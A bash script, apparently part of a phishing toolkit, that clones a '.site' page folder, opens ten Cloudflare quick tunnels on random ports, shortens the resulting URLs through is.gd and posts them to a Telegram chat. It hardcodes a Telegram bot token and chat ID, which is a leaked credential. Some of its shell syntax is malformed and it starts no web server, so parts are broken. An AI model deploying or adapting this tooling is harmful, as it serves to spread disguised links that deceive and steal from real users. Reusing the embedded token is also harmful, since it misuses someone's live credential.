#!/bin/bash

# Start Cloudflared manually
cloudflared_start_manual() {
    GREEN="\033[0;32m"
    WHITE="\033[1;37m"
    MAGENTA="\033[0;35m"
    CYAN="\033[0;36m"
    
    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://localhost:$port ${GREEN})"
    { sleep 1; setup_clone_manual; }
    echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "http://localhost:$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    else
        sleep 2 && ./.host/cloudflared tunnel -url "http://localhost:$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
    fi

    { sleep 12; clear; header; }

    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
    cldflr_url1=${cldflr_url#https://}

    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")

    # Set your Telegram bot details
		bot_token="5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"
		chat_id="-821080105"

    # Send the URL to Telegram
    curl -s "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$url_short"
}

# Generate random ports
generate_random_port() {
    min_port=1024
    max_port=65535
    port=$((RANDOM % (max_port - min_port + 1) + min_port))
}

# Set the host to localhost
host="localhost"

# Function to clone from .site folder to .www folder
setup_clone_manual() {
    if [ ! -d ".www" ]; then
        cp -r .site .www
    fi
}

# Number of links to deploy
num_links=10

# Deploy multiple links
for ((i=1; i<=$num_links; i++))
do
    # Generate random ports for Cloudflare
    generate_random_port
    port=$port

    # Call the function to start Cloudflared manually and send the URL to Telegram
    cloudflared_start_manual
done
		# Send the URL to a Telegram bot

